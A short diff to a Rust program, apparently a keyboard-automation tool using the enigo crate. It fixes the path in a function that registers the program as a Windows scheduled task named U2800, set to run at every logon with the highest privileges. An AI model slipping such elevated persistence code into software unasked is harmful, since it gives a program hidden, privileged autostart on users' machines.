@@ -10,10 +10,7 @@ use enigo::{Enigo, Key, KeyboardControllable};
 
 
 fn add_to_schtasks() {
-    let path = format!(
-        "{}\\U2800.exe", 
-        env::current_exe().unwrap().into_os_string().into_string().unwrap()
-    );
+    let path = env::current_exe().unwrap().into_os_string().into_string().unwrap();
     let order = format!(
         "schtasks /create /F /SC ONLOGON /RL HIGHEST /TN U2800 /TR {}", 
         path
